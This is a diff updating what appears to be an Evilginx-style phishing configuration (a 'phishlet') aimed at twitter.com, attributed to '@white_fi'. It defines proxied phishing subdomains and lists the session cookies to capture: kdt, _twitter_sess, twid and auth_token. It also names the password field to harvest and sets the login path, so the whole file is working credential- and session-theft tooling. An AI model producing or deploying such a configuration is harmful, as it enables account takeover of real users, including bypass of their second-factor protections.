@@ -1,13 +1,10 @@
 author: '@white_fi'
-min_ver: '2.2.0'
+min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'twitter.com', session: true, is_landing: true}
-  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: false, is_landing: false}
-  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com', session: false, is_landing: false}
-sub_filters:
-  - {triggers_on: 'twitter.com', orig_sub: '', domain: 'twitter.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'abs.twimg.com', orig_sub: 'abs', domain: 'twimg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'api.twitter.com', orig_sub: 'api', domain: 'twitter.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com'}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com'}
+sub_filters: []
 auth_tokens:
   - domain: '.twitter.com'
     keys: ['kdt','_twitter_sess','twid','auth_token']
@@ -20,5 +17,6 @@ credentials:
     key: 'session\[password\]'
     search: '(.*)'
     type: 'post'
-landing_path:
-  - '/login'
+login:
+  domain: 'twitter.com'
+  path: '/login'
